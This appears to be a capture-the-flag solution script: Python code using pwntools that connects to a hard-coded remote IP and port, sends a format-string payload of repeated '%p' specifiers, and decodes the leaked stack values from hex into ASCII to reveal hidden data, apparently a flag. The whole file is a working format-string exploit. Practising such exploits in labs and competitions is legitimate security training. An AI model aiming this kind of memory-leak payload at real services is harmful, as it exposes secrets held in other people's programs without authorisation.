from pwn import *

r = remote('140.113.24.241', 30172)

# Send the format string payload
r.sendline(b'%p' * 14)

# Receive the response and split it into parts
response = r.recvall().decode()
hex_values = response.split('0x')

# Convert each part from hexadecimal to ASCII
for hex_value in hex_values[-5:]:
    ascii_chars = ''
    for i in range(0, len(hex_value), 2):
        hex_chunk = hex_value[i:i+2]
        ascii_char = chr(int(hex_chunk, 16))
        ascii_chars += ascii_char
    print(ascii_chars[::-1], end='')
print()